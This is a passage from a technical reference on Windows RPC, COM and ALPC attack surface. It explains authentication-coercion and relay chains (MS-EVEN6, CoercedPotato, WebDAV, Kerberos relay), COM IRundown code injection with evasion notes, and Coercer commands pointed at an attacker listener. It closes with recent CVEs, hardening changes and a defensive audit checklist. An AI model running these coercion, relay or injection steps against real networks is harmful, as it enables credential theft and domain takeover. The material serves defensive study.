coercion path that remains functional even when the Print Spooler service is disabled
— a common defense-in-depth measure following PrintNightmare:

```
Interface UUID: f6beaff7-1e19-4fbb-9f8f-b89e2018337c
Method:         EvtRpcRegisterRemoteSubscription

Trigger:
  EvtRpcRegisterRemoteSubscription(
      server=target,
      path=query,
      query="*",
      bookmark=NULL,
      flags=0x04,   // SUBSCRIBE_TO_FUTURE
      ...
  )
  → Server attempts to open UNC subscription path
  → Outbound NTLM/Kerberos authentication to attacker

Why stealthy:
  - EventLog service is always running (unlike Print Spooler which can be disabled)
  - Less monitored than RPRN/EFSR interfaces
  - Blends in with legitimate event subscription traffic
```

```python
# Coercer v2+ includes MS-EVEN6 as a coercion module
# Usage: python3 Coercer.py coerce --target <dc_ip> --listener <attacker_ip> --protocol even6
```

### 6.7 CoercedPotato (2024) — Local DCOM/RPC Coercion

CoercedPotato is a 2024 technique for local privilege escalation that uses DCOM/RPC to
coerce a SYSTEM process into authenticating to the attacker's listener on localhost. It
was designed to bypass mitigations applied to JuicyPotato and RoguePotato:

```
Previous techniques (JuicyPotato / RoguePotato) relied on:
  - COM activation with specific CLSIDs (many now blocklisted)
  - Named pipe impersonation (mitigated in Server 2025)
  - OXID resolver tricks (patched)

CoercedPotato bypasses these by:
  1. Using DCOM remote activation to a localhost listener
     (avoids the blocklisted CLSIDs)
  2. The RPC/DCOM call causes NT AUTHORITY\SYSTEM → NTLM auth to localhost
  3. Relay localhost NTLM to a localhost named pipe server
     (using the cross-session relay trick)
  4. ImpersonateNamedPipeClient → SYSTEM token → CreateProcessWithToken

Requirements: SeImpersonatePrivilege (held by service accounts, IIS AppPool, etc.)
```

```
Tool: https://github.com/hackvens/CoercedPotato
Target: Windows Server 2019/2022, unpatched environments
Status: Active (no direct patch; Server 2025 pipe hardening partially mitigates)
```

### 6.8 WebDAV Coercion

WebDAV coercion uses the Windows WebDAV redirector (`davclnt.dll` / `webclient` service)
as the transport for coerced authentication. It provides HTTP-based coercion that bypasses
SMB signing requirements (which block SMB coercion relaying):

```
Why it bypasses SMB signing:
  Normal coercion → NTLM over SMB → relay to SMB target → blocked if SMB signing enabled
  WebDAV coercion → NTLM over HTTP → relay to LDAP/LDAPS/AD CS → works regardless of SMB signing

Trigger:
  1. Coerce victim to access \\attacker@80\DavWWWRoot\trigger
     (The @ port syntax triggers WebDAV instead of SMB)
  2. Windows WebClient service handles the UNC resolution via HTTP/WebDAV
  3. NTLM authentication sent over HTTP to port 80 on attacker
  4. Relay to LDAP → RBCD → compromise, or relay to AD CS → certificate

Requirement: WebClient service must be running on victim
  (Enabled by default on workstations; disabled on servers)
  Can be started remotely if attacker has access via other means:
    Start-Service WebClient -ComputerName victim  (requires admin)
```

### 6.9 RemoteKrbRelay — Kerberos Coercion

An emerging 2024 technique extending coercion beyond NTLM to Kerberos tickets:

```
Classic limitation: NTLM relay blocked by Extended Protection for Authentication (EPA)
                    and LDAP channel binding
Kerberos relay: Instead of relaying NTLM, force a Kerberos ticket for a specific SPN
                then relay the Kerberos AP-REQ to the target service

Flow:
  1. Coerce authentication from victim machine account
  2. Victim requests Kerberos TGS for attacker's SPN (e.g., cifs/attacker.domain.local)
  3. Attacker changes the requested SPN to the target (e.g., ldap/dc.domain.local)
     via Kerberos relay (KrbRelayUp technique)
  4. Relay the AP-REQ to LDAP/LDAPS on the DC
  5. Modify AD objects: add machine account, set RBCD, modify ACLs

Tools: KrbRelayUp (Cube0x0), RemoteKrbRelay
Reference: https://github.com/Dec0ne/KrbRelayUp
```

### 6.10 The Relay Target Decision Matrix

When coercion produces an NTLM/Kerberos authentication, the value depends on the relay target:

| Relay Target | Required Conditions | Outcome |
|---|---|---|
| **LDAP (plain)** | No LDAP signing enforced | Create machine account, set RBCD, modify ACEs |
| **LDAPS** | No LDAP channel binding | Same as LDAP |
| **AD CS (HTTP enrollment)** | AD CS installed with Web Enrollment | Certificate → Kerberos TGT |
| **SMB on another host** | SMB signing disabled | Code execution on relay target |
| **Same host SMB** | Blocked by default (loopback auth restriction) | Usually fails |
| **Kerberos (RBCD)** | Kerberos ticket available, target has SPN | Resource-Based Constrained Delegation |

### 6.11 Coercer v2+ Tool Reference

Coercer v2+ (p0dalirius, 2024) now implements 30+ coercion methods across multiple protocols:

```bash
# Scan target for available coercion methods
python3 Coercer.py scan --target <dc_ip> --listener <attacker_ip> -u user -p pass -d domain

# Coerce using all available methods
python3 Coercer.py coerce --target <dc_ip> --listener <attacker_ip> -u user -p pass -d domain

# Coerce using specific protocol only
python3 Coercer.py coerce --target <dc_ip> --listener <attacker_ip> \
    --protocol ms-efsr -u user -p pass -d domain

# Available protocols in v2+:
#   ms-rprn, ms-efsr, ms-dfsnm, ms-fsrvp, ms-par, ms-even6,
#   ms-dcom, ms-rrp (pre-CVE-2024-43532 patch)
```

Reference: https://github.com/p0dalirius/Coercer

---

## 7. COM IRundown::DoCallback — Cross-Process Injection via COM

`IRundown` is an undocumented COM runtime interface registered in every COM-initialized
process. It is used internally by COM to notify processes that objects are being released.
The `DoCallback` method accepts a function pointer and data pointer and calls the function
in the target process's context — an intended COM mechanism repurposed as a code injection
primitive.

```
ATTACK:
1. Enumerate COM-initialized processes:
   Get-NtAlpcServer | Where-Object { $_.Name -like "*OLE*" }
   (Each COM-initialized process has an ALPC port named \RPC Control\OLE{GUID})

2. Connect to target process's COM runtime via ALPC
   (Using NtApiDotNet or custom DCOM connection code)

3. Query IRundown interface on the target's registered class factory
   (IUnknown::QueryInterface for IRundown's GUID)

4. Call DoCallback(FunctionPointer, DataPointer)
   → Function is called inside the target process
   → If target is SYSTEM, attacker gains SYSTEM code execution

DETECTION EVASION:
  - Does NOT use CreateRemoteThread, WriteProcessMemory, or VirtualAllocEx
  - Standard DCOM API call — looks like legitimate COM communication
  - Many EDRs only hook the "classic" injection APIs

MITIGATIONS:
  - Partially mitigated in newer Windows (additional checks on IRundown callers)
  - Known to EDR vendors; signatures exist for the call pattern
```

---

## 8. Enumeration and Tooling Reference

### 8.1 Complete Enumeration Workflow

```powershell
# ── Step 1: Install tooling ──────────────────────────────────────────
Install-Module NtObjectManager

# ── Step 2: Enumerate all RPC servers ────────────────────────────────
$servers = Get-RpcServer -ParseProcess
$servers | Select-Object ProcessId, FilePath, InterfaceId, AuthType, AuthLevel |
  Where-Object { $_.AuthLevel -le 2 }  # No auth or connect-only auth

# ── Step 3: Find named pipes accessible from current context ─────────
Get-ChildItem \\.\pipe\ | ForEach-Object {
    try {
        $sd = Get-NtSecurityDescriptor -Win32Path "\\.\pipe\$($_.Name)"
        [PSCustomObject]@{ Name = $_.Name; SDDL = $sd.ToSddl() }
    } catch {}
}

# ── Step 4: Enumerate ALPC ports ─────────────────────────────────────
Get-AccessibleAlpcPort -Path "\RPC Control" |
  Format-Table Name, MaxGrantedAccess

# ── Step 5: COM server enumeration ───────────────────────────────────
# Use OleViewDotNet (separate tool, same author):
#   File → View COM Objects → sort by Security → review LaunchPermission

# ── Step 6: Test RPC coercibility ────────────────────────────────────
# Coercer v2+ tool:
python3 Coercer.py scan --target <dc_ip> --listener <attacker_ip> -u user -p pass -d domain
#   Reports which coercion methods are available on target

# ── Step 7: Check for CVE-2024-43532 patch status ────────────────────
# Verify Remote Registry service is patched (October 2024 CU)
$patch = Get-HotFix | Where-Object { $_.HotFixID -like "KB5044273" }
if (-not $patch) { Write-Warning "CVE-2024-43532 patch may not be applied" }
```

### 8.2 Tool Reference

| Tool | Purpose | Primary Use |
|---|---|---|
| **NtObjectManager** (PowerShell) | RPC/COM/ALPC enumeration, access check | Systematic attack surface mapping |
| **OleViewDotNet** | COM object GUI analysis, AppID security | COM server audit |
| **RpcView** | RPC endpoint visualization, IDL decompilation | Protocol reverse engineering |
| **impacket** | Python RPC/SMB/NTLM/Kerberos implementation | Coercion relay chains, custom RPC clients |
| **Coercer v2+** | Automated coercion testing, 30+ methods | Quick assessment of coercion surface |
| **RPC Firewall** | RPC call filtering and monitoring | Detection and attack surface reduction |
| **pipelist** (Sysinternals) | Named pipe enumeration | Quick pipe inventory |
| **WinObj** (Sysinternals) | Object namespace browser | \RPC Control\ pipe namespace |
| **KrbRelayUp** | Kerberos relay from SYSTEM service coercion | Local privilege escalation |
| **CoercedPotato** | DCOM/RPC local coercion LPE | SeImpersonatePrivilege escalation |
| **Responder** | NTLM hash capture listener | Coercion chain, capture hashes |
| **ntlmrelayx** (impacket) | NTLM relay to LDAP/AD CS/SMB | Coercion-to-domain-compromise |

---

## 9. Recent Developments (2024–2025)

### 9.1 CVE Summary Table

| CVE | Component | CVSS | Type | Patched |
|---|---|---|---|---|
| CVE-2024-26229 | CSC Service RPC | 7.8 | LPE | March 2024 |
| CVE-2024-30088 | Windows Kernel ALPC | 7.0 | LPE (race condition) | June 2024 |
| CVE-2024-38100 | COM Activation | 7.8 | Security bypass / LPE | July 2024 |
| CVE-2024-43532 | Remote Registry RPC (WinReg) | 8.8 | NTLM coercion / relay | October 2024 |
| CVE-2024-43639 | Windows Kerberos | Critical | RCE | November 2024 |
| CVE-2025-21377 | COM Object Instantiation | 6.5 | NTLM hash disclosure | February 2025 |
| CVE-2025-21418 | AFD.sys + ALPC interaction | 7.8 | LPE (exploited in wild) | February 2025 |

### 9.2 CVE-2025-21418 — AFD.sys + ALPC Interaction 0-day

**CVE-2025-21418** was a zero-day vulnerability exploited in the wild before Microsoft's
February 2025 Patch Tuesday. It involved an interaction between the Ancillary Function
Driver for WinSock (`AFD.sys`) and the ALPC subsystem:

```
Vulnerability class: Use-after-free / type confusion at the AFD.sys / ALPC boundary
CVSS: 7.8 (High) — Local Privilege Escalation
Exploitation status: Confirmed in-the-wild exploitation prior to patch (February 2025)

Technical detail (based on patch diff analysis):
  AFD.sys handles socket I/O completion via ALPC messages when certain async
  socket operations cross process boundaries. A race condition in the ALPC
  message handling inside AFD.sys allowed an attacker to corrupt a reference-
  counted kernel object, leading to an exploitable use-after-free.

Attack path:
  1. Create a socket in one thread and begin an overlapped I/O operation
  2. In a concurrent thread, close the socket while the ALPC completion is pending
  3. AFD.sys processes the ALPC completion message against a freed object
  4. Exploit the UAF to overwrite an adjacent kernel object
  5. Gain arbitrary kernel write → SYSTEM token
```

**Detection indicators:**
- Unusual `AFD.sys` exception traces in crash dumps or kernel event logs
- Abnormal patterns of socket create/destroy with overlapped I/O
- ETW: `Microsoft-Windows-Kernel-Network` events with anomalous AFD call sequences

Reference: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21418

### 9.3 ALPC Research: Windows Server 2025 Changes

Windows Server 2025 introduced several ALPC-related hardening changes, most of which
were not publicly documented by Microsoft but were discovered via patch diffing:

**Change 1: Mandatory integrity level enforcement at ALPC connection**

Previous behavior: ALPC port connection was gated only by the port's DACL (owner-set).
New behavior: The kernel additionally checks that the connecting process's integrity level
meets a minimum threshold specified via a new `ALPC_PORT_ATTR` flag.

```c
// New ALPC_PORT_ATTRIBUTES field (Server 2025+)
typedef struct _ALPC_PORT_ATTRIBUTES {
    ULONG Flags;
    SECURITY_QUALITY_OF_SERVICE SecurityQos;
    SIZE_T MaxMessageLength;
    SIZE_T MemoryBandwidth;
    SIZE_T MaxPoolUsage;
    SIZE_T MaxSectionSize;
    SIZE_T MaxViewSize;
    SIZE_T MaxTotalSectionSize;
    ULONG DupObjectTypes;
    ULONG MinIntegrityLevel;  // ← New in Server 2025 (undocumented)
} ALPC_PORT_ATTRIBUTES;
```

**Change 2: Restricted anonymous pipe access on ALPC-backed pipes**

ALPC ports used as backing for `ncalrpc` named pipes now enforce that connecting processes
carry a non-anonymous token. Connections from processes running under anonymous tokens
(some sandboxed processes) are blocked with `STATUS_ACCESS_DENIED`.

**Change 3: ALPC handle leak hardening**

Previously, ALPC `HandleAttribute` messages could be used to leak handle values from one
process to another without proper access checking. Server 2025 adds additional validation
in `NtAlpcSendWaitReceivePort` when processing `ALPC_MESSAGE_HANDLE_INFORMATION` attributes.

### 9.4 Coercion Landscape Shift: Post-NTLM and EPA Hardening

As Microsoft continues to roll out Extended Protection for Authentication (EPA) and
NTLM deprecation roadmap items, the coercion-to-relay chain is evolving:

**NTLM deprecation roadmap (as of 2025):**
- Windows 11 24H2 and Server 2025: NTLM auditing mode enabled by default
- Future versions: NTLM disabled by default in new domain deployments
- Impact on coercion: relay chains requiring NTLM become less reliable

**Post-NTLM coercion value:**
Even without NTLM relay, coercion retains value through:
1. **Kerberos relay (KrbRelayUp / RemoteKrbRelay)**: relay Kerberos tickets instead of NTLM
2. **Hash capture for offline cracking**: NTLMv2 hashes still crackable (if weak passwords)
3. **Direct PKINIT abuse**: if coercion produces a certificate (ESC8 path), NTLM not needed
4. **Shadow Credentials**: relay to LDAP to set `msDS-KeyCredentialLink` for target account

```powershell
# Check if NTLM auditing is active on a domain
(Get-GPO -All | Get-GPOReport -ReportType Xml) -match "NTLMv1|RestrictNTLM"

# Enumerate if EPA is enforced on AD CS enrollment endpoints
certutil -config "CA\CA-Name" -getreg policy\EditFlags
# Look for: EDITF_ENABLEREQUESTEXT (hex: 0x00040000) = ESC8 present
```

### 9.5 Tooling Updates 2024–2025

**Coercer v2+ (p0dalirius)**
- Expanded from 12 methods (v1) to 30+ methods (v2+)
- Added MS-EVEN6, MS-DCOM, and undocumented RPC interface coercions
- New `--protocol` flag for selective testing
- GitHub: https://github.com/p0dalirius/Coercer

**OleViewDotNet v1.14+**
- Added Windows Server 2025 ALPC hardening analysis features
- New "ALPC Port Security" view showing integrity level requirements
- Improved DCOM activation path visualization showing Server 2025 changes
- GitHub: https://github.com/tyranid/oleviewdotnet

**RPC Firewall 2.0 (zeronetworks)**
- Expanded filter grammar for blocking specific RPC interfaces
- New alert mode for coercion interface calls (MS-RPRN, MS-EFSR, MS-EVEN6, etc.)
- GitHub: https://github.com/zeronetworks/RPC-Firewall

---

## 10. Defensive Audit Checklist for RPC/COM Services

1. **Authentication level**: Does every registered interface enforce at minimum `PKT_INTEGRITY`?
   `RPC_C_AUTHN_LEVEL_NONE` or `CONNECT` on a SYSTEM service = critical finding.

2. **Security callback**: Does every interface have a security callback? Does it correctly
   validate authentication level AND caller identity?

3. **Named pipe DACL**: Does the pipe restrict `FILE_CREATE_PIPE_INSTANCE` to prevent squatting?
   Does the pipe's SD match the expected client population (not `Everyone: ReadWrite`)?

4. **ALPC port SD**: Does the port SD restrict who can connect? For privileged ports, does the
   SD enforce a minimum integrity level (e.g., `ML:M` for medium)? On Server 2025, is
   `MinIntegrityLevel` set in the port attributes?

5. **COM LaunchPermission / AccessPermission**: Does the AppID restrict these to the expected
   callers? `Everyone: Launch` on a SYSTEM COM server = high-severity finding.

6. **UNC path parameters**: Does any RPC method accept a path parameter that is passed to a
   file open call? If yes = potential coercion vector. Does the server validate that the path
   is local before opening it?

7. **Impersonation level**: When the server impersonates the caller, does it verify the
   impersonation level is acceptable before proceeding? Does it revert promptly after?

8. **Coercion interfaces**: Are MS-RPRN, MS-EFSR, MS-EVEN6, and MS-DFSNM exposed on
   servers where they are not needed? Consider blocking via Windows Firewall or RPC Firewall.

9. **Remote Registry (CVE-2024-43532)**: Is October 2024 Patch Tuesday applied? Is the
   Remote Registry service disabled where not needed?

10. **NTLM relay protection**: Is EPA (Extended Protection for Authentication) enabled on all
    HTTP-based authentication endpoints? Is AD CS Web Enrollment (ESC8) hardened or disabled?

11. **WebDAV coercion**: Is the WebClient service disabled on servers? Is port 80 outbound
    blocked from server segments to attacker-controlled hosts?

---

## References

[R-1] *Windows Internals, Part 1 — ALPC and COM Chapters* — Mark Russinovich, David Solomon, Alex Ionescu, Pavel Yosifovich — https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals

[R-2] *sandbox-attacksurface-analysis-tools (NtObjectManager / OleViewDotNet)* — James Forshaw / Google Project Zero — https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools

[R-3] *RpcView — RPC Endpoint Visualization* — silverf0x — https://github.com/silverf0x/RpcView

[R-4] *tiraniddo.dev — RPC, COM, and ALPC Security Research Series* — James Forshaw — https://www.tiraniddo.dev/

[R-5] *impacket — Python Windows Protocol Implementation* — Fortra / community — https://github.com/fortra/impacket

[R-6] *PetitPotam (CVE-2021-36942) — EFSRPC Authentication Coercion* — topotam (Gilles Lionel) — https://github.com/topotam/PetitPotam

[R-7] *CVE-2021-1675 PrintNightmare PoC* — cube0x0 — https://github.com/cube0x0/CVE-2021-1675

[R-8] *Coercer v2+ — Authentication Coercion Testing Tool (30+ methods)* — p0dalirius — https://github.com/p0dalirius/Coercer

[R-9] *CVE-2024-43532 — Windows Remote Registry NTLM Coercion* — Akamai Security Research, October 2024 — https://www.akamai.com/blog/security-research/2024/oct/windows-registry-ntlm-coercion

[R-10] *CVE-2024-30088 — Windows Kernel ALPC Race Condition* — Microsoft Security Response Center — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30088

[R-11] *CVE-2024-38100 — COM Activation Security Bypass* — Microsoft Security Response Center — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38100

[R-12] *CVE-2024-43639 — Windows Kerberos RCE* — Microsoft Security Response Center, November 2024 — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43639

[R-13] *CVE-2025-21377 — NTLM Hash Disclosure via COM Object Instantiation* — Microsoft Security Response Center, February 2025 — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21377

[R-14] *CVE-2025-21418 — AFD.sys + ALPC Interaction 0-day (exploited in wild)* — Microsoft Security Response Center, February 2025 — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21418

[R-15] *"The COM-Back" — Bypassing COM Activation Security* — James Forshaw, Google Project Zero, January 2025 — https://googleprojectzero.blogspot.com/2025/01/

[R-16] *DCOM Hardening Bypass via Legacy COM Activation Paths (KB5004442)* — Rapid7 Research, October 2024 — https://www.rapid7.com/blog/post/2024/10/

[R-17] *CoercedPotato — DCOM/RPC Local Coercion LPE* — hackvens — https://github.com/hackvens/CoercedPotato

[R-18] *KrbRelayUp — Kerberos Relay from SYSTEM Service* — Dec0ne — https://github.com/Dec0ne/KrbRelayUp

[R-19] *RPC Firewall 2.0 — RPC Call Filtering and Monitoring* — Zero Networks — https://github.com/zeronetworks/RPC-Firewall

[R-20] *Windows Server 2025 Named Pipe and ALPC Hardening Analysis* — SpecterOps / MDSec Research, 2024 — https://posts.specterops.io/

[R-21] *MS-EVEN6 EventLog RPC Coercion* — p0dalirius — included in Coercer v2+ documentation at https://github.com/p0dalirius/Coercer

[R-22] *CVE-2024-26229 — Windows CSC Service RPC LPE* — Microsoft Security Response Center, March 2024 — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-26229
